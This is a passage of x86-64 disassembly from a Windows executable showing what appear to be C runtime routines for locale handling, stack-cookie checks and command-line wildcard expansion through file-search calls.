   140008711:	77 1e                	ja     0x140008731
   140008713:	48 8b 0e             	mov    (%rsi),%rcx
   140008716:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   14000871a:	48 8b d5             	mov    %rbp,%rdx
   14000871d:	4d 8b c7             	mov    %r15,%r8
   140008720:	e8 8b 29 00 00       	call   0x14000b0b0
   140008725:	48 85 c0             	test   %rax,%rax
   140008728:	75 16                	jne    0x140008740
   14000872a:	33 c9                	xor    %ecx,%ecx
   14000872c:	e8 df f8 ff ff       	call   0x140008010
   140008731:	48 8b cb             	mov    %rbx,%rcx
   140008734:	bf 0c 00 00 00       	mov    $0xc,%edi
   140008739:	e8 d2 f8 ff ff       	call   0x140008010
   14000873e:	eb 25                	jmp    0x140008765
   140008740:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140008744:	48 89 06             	mov    %rax,(%rsi)
   140008747:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   14000874b:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   14000874f:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   140008753:	33 c9                	xor    %ecx,%ecx
   140008755:	e8 b6 f8 ff ff       	call   0x140008010
   14000875a:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000875e:	48 89 19             	mov    %rbx,(%rcx)
   140008761:	4c 01 7e 08          	add    %r15,0x8(%rsi)
   140008765:	33 c9                	xor    %ecx,%ecx
   140008767:	e8 a4 f8 ff ff       	call   0x140008010
   14000876c:	8b c7                	mov    %edi,%eax
   14000876e:	e9 de fe ff ff       	jmp    0x140008651
   140008773:	45 33 c9             	xor    %r9d,%r9d
   140008776:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000877b:	45 33 c0             	xor    %r8d,%r8d
   14000877e:	33 d2                	xor    %edx,%edx
   140008780:	33 c9                	xor    %ecx,%ecx
   140008782:	e8 5d f6 ff ff       	call   0x140007de4
   140008787:	cc                   	int3
   140008788:	40 55                	rex push %rbp
   14000878a:	53                   	push   %rbx
   14000878b:	56                   	push   %rsi
   14000878c:	57                   	push   %rdi
   14000878d:	41 54                	push   %r12
   14000878f:	41 55                	push   %r13
   140008791:	41 56                	push   %r14
   140008793:	48 8d ac 24 c0 fd ff 	lea    -0x240(%rsp),%rbp
   14000879a:	ff 
   14000879b:	48 81 ec 40 03 00 00 	sub    $0x340,%rsp
   1400087a2:	48 8b 05 57 58 01 00 	mov    0x15857(%rip),%rax        # 0x14001e000
   1400087a9:	48 33 c4             	xor    %rsp,%rax
   1400087ac:	48 89 85 30 02 00 00 	mov    %rax,0x230(%rbp)
   1400087b3:	4d 8b e0             	mov    %r8,%r12
   1400087b6:	48 8b f9             	mov    %rcx,%rdi
   1400087b9:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   1400087c0:	20 00 00 
   1400087c3:	48 3b d1             	cmp    %rcx,%rdx
   1400087c6:	74 22                	je     0x1400087ea
   1400087c8:	8a 02                	mov    (%rdx),%al
   1400087ca:	2c 2f                	sub    $0x2f,%al
   1400087cc:	3c 2d                	cmp    $0x2d,%al
   1400087ce:	77 0a                	ja     0x1400087da
   1400087d0:	48 0f be c0          	movsbq %al,%rax
   1400087d4:	48 0f a3 c3          	bt     %rax,%rbx
   1400087d8:	72 10                	jb     0x1400087ea
   1400087da:	48 8b cf             	mov    %rdi,%rcx
   1400087dd:	e8 16 43 00 00       	call   0x14000caf8
   1400087e2:	48 8b d0             	mov    %rax,%rdx
   1400087e5:	48 3b c7             	cmp    %rdi,%rax
   1400087e8:	75 de                	jne    0x1400087c8
   1400087ea:	44 8a 02             	mov    (%rdx),%r8b
   1400087ed:	41 80 f8 3a          	cmp    $0x3a,%r8b
   1400087f1:	75 1e                	jne    0x140008811
   1400087f3:	48 8d 47 01          	lea    0x1(%rdi),%rax
   1400087f7:	48 3b d0             	cmp    %rax,%rdx
   1400087fa:	74 15                	je     0x140008811
   1400087fc:	4d 8b cc             	mov    %r12,%r9
   1400087ff:	45 33 c0             	xor    %r8d,%r8d
   140008802:	33 d2                	xor    %edx,%edx
   140008804:	48 8b cf             	mov    %rdi,%rcx
   140008807:	e8 f8 fd ff ff       	call   0x140008604
   14000880c:	e9 b4 02 00 00       	jmp    0x140008ac5
   140008811:	41 80 e8 2f          	sub    $0x2f,%r8b
   140008815:	45 33 f6             	xor    %r14d,%r14d
   140008818:	41 80 f8 2d          	cmp    $0x2d,%r8b
   14000881c:	77 0c                	ja     0x14000882a
   14000881e:	49 0f be c0          	movsbq %r8b,%rax
   140008822:	48 0f a3 c3          	bt     %rax,%rbx
   140008826:	b0 01                	mov    $0x1,%al
   140008828:	72 03                	jb     0x14000882d
   14000882a:	41 8a c6             	mov    %r14b,%al
   14000882d:	48 2b d7             	sub    %rdi,%rdx
   140008830:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140008834:	48 ff c2             	inc    %rdx
   140008837:	41 b8 50 02 00 00    	mov    $0x250,%r8d
   14000883d:	f6 d8                	neg    %al
   14000883f:	4d 1b ed             	sbb    %r13,%r13
   140008842:	4c 23 ea             	and    %rdx,%r13
   140008845:	33 d2                	xor    %edx,%edx
   140008847:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   14000884c:	e8 af 68 00 00       	call   0x14000f100
   140008851:	33 d2                	xor    %edx,%edx
   140008853:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   140008858:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000885d:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140008862:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140008867:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000886c:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   140008871:	44 88 74 24 68       	mov    %r14b,0x68(%rsp)
   140008876:	e8 6d 02 00 00       	call   0x140008ae8
   14000887b:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140008880:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140008885:	39 48 0c             	cmp    %ecx,0xc(%rax)
   140008888:	75 17                	jne    0x1400088a1
   14000888a:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   14000888e:	74 0c                	je     0x14000889c
   140008890:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140008895:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000889c:	44 8b c9             	mov    %ecx,%r9d
   14000889f:	eb 38                	jmp    0x1400088d9
   1400088a1:	e8 7a 25 00 00       	call   0x14000ae20
   1400088a6:	85 c0                	test   %eax,%eax
   1400088a8:	75 1a                	jne    0x1400088c4
   1400088aa:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   1400088ae:	74 0c                	je     0x1400088bc
   1400088b0:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400088b5:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400088bc:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400088c2:	eb 15                	jmp    0x1400088d9
   1400088c4:	44 38 75 88          	cmp    %r14b,-0x78(%rbp)
   1400088c8:	74 0c                	je     0x1400088d6
   1400088ca:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400088cf:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400088d6:	45 8b ce             	mov    %r14d,%r9d
   1400088d9:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400088de:	48 8b cf             	mov    %rdi,%rcx
   1400088e1:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400088e6:	e8 91 f7 ff ff       	call   0x14000807c
   1400088eb:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400088f0:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400088f4:	85 c0                	test   %eax,%eax
   1400088f6:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400088fb:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140008900:	49 0f 45 ce          	cmovne %r14,%rcx
   140008904:	45 33 c9             	xor    %r9d,%r9d
   140008907:	33 d2                	xor    %edx,%edx
   140008909:	ff 15 79 78 00 00    	call   *0x7879(%rip)        # 0x140010188
   14000890f:	48 8b d8             	mov    %rax,%rbx
   140008912:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140008916:	75 2a                	jne    0x140008942
   140008918:	4d 8b cc             	mov    %r12,%r9
   14000891b:	45 33 c0             	xor    %r8d,%r8d
   14000891e:	33 d2                	xor    %edx,%edx
   140008920:	48 8b cf             	mov    %rdi,%rcx
   140008923:	e8 dc fc ff ff       	call   0x140008604
   140008928:	8b d8                	mov    %eax,%ebx
   14000892a:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   14000892f:	74 0a                	je     0x14000893b
   140008931:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008936:	e8 d5 f6 ff ff       	call   0x140008010
   14000893b:	8b c3                	mov    %ebx,%eax
   14000893d:	e9 83 01 00 00       	jmp    0x140008ac5
   140008942:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
   140008947:	49 2b 34 24          	sub    (%r12),%rsi
   14000894b:	48 c1 fe 03          	sar    $0x3,%rsi
   14000894f:	33 d2                	xor    %edx,%edx
   140008951:	4c 89 75 b0          	mov    %r14,-0x50(%rbp)
   140008955:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140008959:	4c 89 75 b8          	mov    %r14,-0x48(%rbp)
   14000895d:	4c 89 75 c0          	mov    %r14,-0x40(%rbp)
   140008961:	4c 89 75 c8          	mov    %r14,-0x38(%rbp)
   140008965:	4c 89 75 d0          	mov    %r14,-0x30(%rbp)
   140008969:	44 88 75 d8          	mov    %r14b,-0x28(%rbp)
   14000896d:	e8 76 01 00 00       	call   0x140008ae8
   140008972:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   140008976:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000897b:	39 48 0c             	cmp    %ecx,0xc(%rax)
   14000897e:	75 16                	jne    0x140008996
   140008980:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   140008984:	74 0b                	je     0x140008991
   140008986:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000898a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008991:	44 8b c9             	mov    %ecx,%r9d
   140008994:	eb 36                	jmp    0x1400089cc
   140008996:	e8 85 24 00 00       	call   0x14000ae20
   14000899b:	85 c0                	test   %eax,%eax
   14000899d:	75 19                	jne    0x1400089b8
   14000899f:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   1400089a3:	74 0b                	je     0x1400089b0
   1400089a5:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400089a9:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400089b0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400089b6:	eb 14                	jmp    0x1400089cc
   1400089b8:	44 38 75 a8          	cmp    %r14b,-0x58(%rbp)
   1400089bc:	74 0b                	je     0x1400089c9
   1400089be:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400089c2:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400089c9:	45 8b ce             	mov    %r14d,%r9d
   1400089cc:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400089d1:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   1400089d5:	48 8d 4d 0c          	lea    0xc(%rbp),%rcx
   1400089d9:	e8 3e f8 ff ff       	call   0x14000821c
   1400089de:	4c 8b 75 c0          	mov    -0x40(%rbp),%r14
   1400089e2:	33 d2                	xor    %edx,%edx
   1400089e4:	85 c0                	test   %eax,%eax
   1400089e6:	49 8b ce             	mov    %r14,%rcx
   1400089e9:	48 0f 45 ca          	cmovne %rdx,%rcx
   1400089ed:	80 39 2e             	cmpb   $0x2e,(%rcx)
   1400089f0:	75 1f                	jne    0x140008a11
   1400089f2:	8a 41 01             	mov    0x1(%rcx),%al
   1400089f5:	84 c0                	test   %al,%al
   1400089f7:	75 0f                	jne    0x140008a08
   1400089f9:	38 55 d8             	cmp    %dl,-0x28(%rbp)
   1400089fc:	74 3a                	je     0x140008a38
   1400089fe:	49 8b ce             	mov    %r14,%rcx
   140008a01:	e8 0a f6 ff ff       	call   0x140008010
   140008a06:	eb 30                	jmp    0x140008a38
   140008a08:	3c 2e                	cmp    $0x2e,%al
   140008a0a:	75 05                	jne    0x140008a11
   140008a0c:	38 51 02             	cmp    %dl,0x2(%rcx)
   140008a0f:	74 e8                	je     0x1400089f9
   140008a11:	4d 8b cc             	mov    %r12,%r9
   140008a14:	4d 8b c5             	mov    %r13,%r8
   140008a17:	48 8b d7             	mov    %rdi,%rdx
   140008a1a:	e8 e5 fb ff ff       	call   0x140008604
   140008a1f:	44 8b e8             	mov    %eax,%r13d
   140008a22:	85 c0                	test   %eax,%eax
   140008a24:	75 74                	jne    0x140008a9a
   140008a26:	38 45 d8             	cmp    %al,-0x28(%rbp)
   140008a29:	74 08                	je     0x140008a33
   140008a2b:	49 8b ce             	mov    %r14,%rcx
   140008a2e:	e8 dd f5 ff ff       	call   0x140008010
   140008a33:	4c 8b 6c 24 38       	mov    0x38(%rsp),%r13
   140008a38:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140008a3c:	48 8b cb             	mov    %rbx,%rcx
   140008a3f:	ff 15 4b 77 00 00    	call   *0x774b(%rip)        # 0x140010190
   140008a45:	45 33 f6             	xor    %r14d,%r14d
   140008a48:	85 c0                	test   %eax,%eax
   140008a4a:	0f 85 ff fe ff ff    	jne    0x14000894f
   140008a50:	49 8b 04 24          	mov    (%r12),%rax
   140008a54:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   140008a59:	48 2b d0             	sub    %rax,%rdx
   140008a5c:	48 c1 fa 03          	sar    $0x3,%rdx
   140008a60:	48 3b f2             	cmp    %rdx,%rsi
   140008a63:	74 17                	je     0x140008a7c
   140008a65:	48 2b d6             	sub    %rsi,%rdx
   140008a68:	48 8d 0c f0          	lea    (%rax,%rsi,8),%rcx
   140008a6c:	4c 8d 0d f5 f5 ff ff 	lea    -0xa0b(%rip),%r9        # 0x140008068
   140008a73:	45 8d 46 08          	lea    0x8(%r14),%r8d
   140008a77:	e8 54 37 00 00       	call   0x14000c1d0
   140008a7c:	48 8b cb             	mov    %rbx,%rcx
   140008a7f:	ff 15 fb 76 00 00    	call   *0x76fb(%rip)        # 0x140010180
   140008a85:	44 38 74 24 68       	cmp    %r14b,0x68(%rsp)
   140008a8a:	74 0a                	je     0x140008a96
   140008a8c:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008a91:	e8 7a f5 ff ff       	call   0x140008010
   140008a96:	33 c0                	xor    %eax,%eax
   140008a98:	eb 2b                	jmp    0x140008ac5
   140008a9a:	80 7d d8 00          	cmpb   $0x0,-0x28(%rbp)
   140008a9e:	74 08                	je     0x140008aa8
   140008aa0:	49 8b ce             	mov    %r14,%rcx
   140008aa3:	e8 68 f5 ff ff       	call   0x140008010
   140008aa8:	48 8b cb             	mov    %rbx,%rcx
   140008aab:	ff 15 cf 76 00 00    	call   *0x76cf(%rip)        # 0x140010180
   140008ab1:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   140008ab6:	74 0a                	je     0x140008ac2
   140008ab8:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008abd:	e8 4e f5 ff ff       	call   0x140008010
   140008ac2:	41 8b c5             	mov    %r13d,%eax
   140008ac5:	48 8b 8d 30 02 00 00 	mov    0x230(%rbp),%rcx
   140008acc:	48 33 cc             	xor    %rsp,%rcx
   140008acf:	e8 3c a6 ff ff       	call   0x140003110
   140008ad4:	48 81 c4 40 03 00 00 	add    $0x340,%rsp
   140008adb:	41 5e                	pop    %r14
   140008add:	41 5d                	pop    %r13
   140008adf:	41 5c                	pop    %r12
   140008ae1:	5f                   	pop    %rdi
   140008ae2:	5e                   	pop    %rsi
   140008ae3:	5b                   	pop    %rbx
   140008ae4:	5d                   	pop    %rbp
   140008ae5:	c3                   	ret
   140008ae6:	cc                   	int3
   140008ae7:	cc                   	int3
   140008ae8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008aed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008af2:	57                   	push   %rdi
   140008af3:	48 83 ec 20          	sub    $0x20,%rsp
   140008af7:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140008afb:	48 8b f9             	mov    %rcx,%rdi
   140008afe:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140008b02:	48 85 d2             	test   %rdx,%rdx
   140008b05:	74 05                	je     0x140008b0c
   140008b07:	0f 10 02             	movups (%rdx),%xmm0
   140008b0a:	eb 10                	jmp    0x140008b1c
   140008b0c:	83 3d 59 63 01 00 00 	cmpl   $0x0,0x16359(%rip)        # 0x14001ee6c
   140008b13:	75 0d                	jne    0x140008b22
   140008b15:	0f 10 05 2c 5c 01 00 	movups 0x15c2c(%rip),%xmm0        # 0x14001e748
   140008b1c:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140008b20:	eb 4e                	jmp    0x140008b70
   140008b22:	e8 59 ed ff ff       	call   0x140007880
   140008b27:	48 89 07             	mov    %rax,(%rdi)
   140008b2a:	48 8b d6             	mov    %rsi,%rdx
   140008b2d:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140008b34:	48 89 0e             	mov    %rcx,(%rsi)
   140008b37:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140008b3e:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140008b42:	48 8b c8             	mov    %rax,%rcx
   140008b45:	e8 12 30 00 00       	call   0x14000bb5c
   140008b4a:	48 8b 0f             	mov    (%rdi),%rcx
   140008b4d:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140008b51:	e8 72 30 00 00       	call   0x14000bbc8
   140008b56:	48 8b 0f             	mov    (%rdi),%rcx
   140008b59:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140008b5f:	a8 02                	test   $0x2,%al
   140008b61:	75 0d                	jne    0x140008b70
   140008b63:	83 c8 02             	or     $0x2,%eax
   140008b66:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140008b6c:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140008b70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008b75:	48 8b c7             	mov    %rdi,%rax
   140008b78:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008b7d:	48 83 c4 20          	add    $0x20,%rsp
   140008b81:	5f                   	pop    %rdi
   140008b82:	c3                   	ret
   140008b83:	cc                   	int3
   140008b84:	e9 3f f8 ff ff       	jmp    0x1400083c8
   140008b89:	cc                   	int3
   140008b8a:	cc                   	int3
   140008b8b:	cc                   	int3
   140008b8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008b91:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008b96:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008b9b:	57                   	push   %rdi
   140008b9c:	48 83 ec 40          	sub    $0x40,%rsp
   140008ba0:	33 ed                	xor    %ebp,%ebp
   140008ba2:	41 8b f1             	mov    %r9d,%esi
   140008ba5:	48 8b da             	mov    %rdx,%rbx
   140008ba8:	48 8b f9             	mov    %rcx,%rdi
   140008bab:	48 85 c9             	test   %rcx,%rcx
   140008bae:	75 1b                	jne    0x140008bcb
   140008bb0:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   140008bb4:	74 04                	je     0x140008bba
   140008bb6:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   140008bba:	48 89 6a 10          	mov    %rbp,0x10(%rdx)
   140008bbe:	48 89 6a 18          	mov    %rbp,0x18(%rdx)
   140008bc2:	48 89 6a 20          	mov    %rbp,0x20(%rdx)
   140008bc6:	e9 c3 00 00 00       	jmp    0x140008c8e
   140008bcb:	66 39 29             	cmp    %bp,(%rcx)
   140008bce:	75 34                	jne    0x140008c04
   140008bd0:	48 39 6a 18          	cmp    %rbp,0x18(%rdx)
   140008bd4:	75 25                	jne    0x140008bfb
   140008bd6:	40 38 6a 28          	cmp    %bpl,0x28(%rdx)
   140008bda:	74 04                	je     0x140008be0
   140008bdc:	40 88 6a 28          	mov    %bpl,0x28(%rdx)
   140008be0:	e8 87 f3 ff ff       	call   0x140007f6c
   140008be5:	b9 22 00 00 00       	mov    $0x22,%ecx
   140008bea:	89 08                	mov    %ecx,(%rax)
   140008bec:	8b c1                	mov    %ecx,%eax
   140008bee:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   140008bf2:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   140008bf6:	e9 95 00 00 00       	jmp    0x140008c90
   140008bfb:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140008bff:	40 88 28             	mov    %bpl,(%rax)
   140008c02:	eb be                	jmp    0x140008bc2
   140008c04:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140008c09:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008c0d:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140008c12:	4c 8b c7             	mov    %rdi,%r8
   140008c15:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140008c19:	33 d2                	xor    %edx,%edx
   140008c1b:	8b ce                	mov    %esi,%ecx
   140008c1d:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140008c22:	e8 31 0e 00 00       	call   0x140009a58
   140008c27:	48 63 d0             	movslq %eax,%rdx
   140008c2a:	85 c0                	test   %eax,%eax
   140008c2c:	75 16                	jne    0x140008c44
   140008c2e:	ff 15 64 74 00 00    	call   *0x7464(%rip)        # 0x140010098
   140008c34:	8b c8                	mov    %eax,%ecx
   140008c36:	e8 c1 f2 ff ff       	call   0x140007efc
   140008c3b:	e8 2c f3 ff ff       	call   0x140007f6c
   140008c40:	8b 00                	mov    (%rax),%eax
   140008c42:	eb 4c                	jmp    0x140008c90
   140008c44:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140008c48:	48 3b d1             	cmp    %rcx,%rdx
   140008c4b:	76 0c                	jbe    0x140008c59
   140008c4d:	40 38 6b 28          	cmp    %bpl,0x28(%rbx)
   140008c51:	74 8d                	je     0x140008be0
   140008c53:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   140008c57:	eb 87                	jmp    0x140008be0
   140008c59:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008c5d:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008c61:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140008c66:	4c 8b c7             	mov    %rdi,%r8
   140008c69:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140008c6e:	33 d2                	xor    %edx,%edx
   140008c70:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140008c74:	8b ce                	mov    %esi,%ecx
   140008c76:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008c7b:	e8 d8 0d 00 00       	call   0x140009a58
   140008c80:	48 98                	cltq
   140008c82:	48 85 c0             	test   %rax,%rax
   140008c85:	74 a7                	je     0x140008c2e
   140008c87:	48 ff c8             	dec    %rax
   140008c8a:	48 89 43 20          	mov    %rax,0x20(%rbx)
   140008c8e:	33 c0                	xor    %eax,%eax
   140008c90:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008c95:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008c9a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008c9f:	48 83 c4 40          	add    $0x40,%rsp
   140008ca3:	5f                   	pop    %rdi
   140008ca4:	c3                   	ret
   140008ca5:	cc                   	int3
   140008ca6:	cc                   	int3
   140008ca7:	cc                   	int3
   140008ca8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008cad:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008cb2:	55                   	push   %rbp
   140008cb3:	48 8d ac 24 60 fe ff 	lea    -0x1a0(%rsp),%rbp
   140008cba:	ff 
   140008cbb:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   140008cc2:	48 8b 05 37 53 01 00 	mov    0x15337(%rip),%rax        # 0x14001e000
   140008cc9:	48 33 c4             	xor    %rsp,%rax
   140008ccc:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   140008cd3:	41 8b f8             	mov    %r8d,%edi
   140008cd6:	48 8b da             	mov    %rdx,%rbx
   140008cd9:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   140008cdf:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140008ce3:	ff 15 2f 74 00 00    	call   *0x742f(%rip)        # 0x140010118
   140008ce9:	85 c0                	test   %eax,%eax
   140008ceb:	75 14                	jne    0x140008d01
   140008ced:	ff 15 a5 73 00 00    	call   *0x73a5(%rip)        # 0x140010098
   140008cf3:	8b c8                	mov    %eax,%ecx
   140008cf5:	e8 02 f2 ff ff       	call   0x140007efc
   140008cfa:	33 c0                	xor    %eax,%eax
   140008cfc:	e9 a4 00 00 00       	jmp    0x140008da5
   140008d01:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   140008d07:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140008d0c:	48 8b c7             	mov    %rdi,%rax
   140008d0f:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140008d14:	33 d2                	xor    %edx,%edx
   140008d16:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140008d1b:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140008d20:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140008d25:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   140008d2a:	e8 b9 fd ff ff       	call   0x140008ae8
   140008d2f:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140008d34:	41 b9 e9 fd 00 00    	mov    $0xfde9,%r9d
   140008d3a:	44 39 48 0c          	cmp    %r9d,0xc(%rax)
   140008d3e:	75 15                	jne    0x140008d55
   140008d40:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   140008d45:	74 47                	je     0x140008d8e
   140008d47:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008d4c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008d53:	eb 39                	jmp    0x140008d8e
   140008d55:	e8 c6 20 00 00       	call   0x14000ae20
   140008d5a:	85 c0                	test   %eax,%eax
   140008d5c:	75 1a                	jne    0x140008d78
   140008d5e:	38 44 24 40          	cmp    %al,0x40(%rsp)
   140008d62:	74 0c                	je     0x140008d70
   140008d64:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008d69:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008d70:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140008d76:	eb 16                	jmp    0x140008d8e
   140008d78:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   140008d7d:	74 0c                	je     0x140008d8b
   140008d7f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008d84:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008d8b:	45 33 c9             	xor    %r9d,%r9d
   140008d8e:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140008d93:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140008d98:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140008d9c:	e8 eb fd ff ff       	call   0x140008b8c
   140008da1:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140008da5:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   140008dac:	48 33 cc             	xor    %rsp,%rcx
   140008daf:	e8 5c a3 ff ff       	call   0x140003110
   140008db4:	4c 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%r11
   140008dbb:	00 
   140008dbc:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140008dc0:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140008dc4:	49 8b e3             	mov    %r11,%rsp
   140008dc7:	5d                   	pop    %rbp
   140008dc8:	c3                   	ret
   140008dc9:	cc                   	int3
   140008dca:	cc                   	int3
   140008dcb:	cc                   	int3
   140008dcc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008dd1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008dd6:	57                   	push   %rdi
   140008dd7:	48 83 ec 40          	sub    $0x40,%rsp
   140008ddb:	49 8b f9             	mov    %r9,%rdi
   140008dde:	49 8b d8             	mov    %r8,%rbx
   140008de1:	8b 0a                	mov    (%rdx),%ecx
   140008de3:	e8 a8 0e 00 00       	call   0x140009c90
   140008de8:	90                   	nop
   140008de9:	48 8b 03             	mov    (%rbx),%rax
   140008dec:	48 8b 08             	mov    (%rax),%rcx
   140008def:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008df6:	48 83 c0 18          	add    $0x18,%rax
   140008dfa:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140008dff:	48 8b 0d b2 60 01 00 	mov    0x160b2(%rip),%rcx        # 0x14001eeb8
   140008e06:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008e0b:	48 85 c9             	test   %rcx,%rcx
   140008e0e:	74 6f                	je     0x140008e7f
   140008e10:	48 85 c0             	test   %rax,%rax
